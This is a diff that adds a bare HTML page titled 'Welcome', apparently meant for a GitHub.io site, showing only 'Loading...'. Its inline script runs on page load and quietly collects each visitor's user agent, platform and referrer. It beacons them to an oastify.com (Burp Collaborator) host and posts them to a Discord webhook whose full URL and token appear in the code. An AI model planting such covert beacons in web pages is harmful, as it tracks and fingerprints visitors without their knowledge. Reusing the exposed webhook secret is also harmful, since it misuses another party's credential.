@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h1>Loading...</h1>
+
+  <script>
+    (function() {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const ref = document.referrer;
+
+      // 1. Burp Collaborator beacon
+      new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?ua=" + encodeURIComponent(ua) + "&platform=" + encodeURIComponent(platform) + "&ref=" + encodeURIComponent(ref);
+
+      // 2. Send to Discord Webhook
+      fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🧲 **GitHub.io Beacon**\n\n**User-Agent**: ${ua}\n**Platform**: ${platform}\n**Referrer**: ${ref}`
+        })
+      });
+    })();
+  </script>
+
+</body>
+</html>
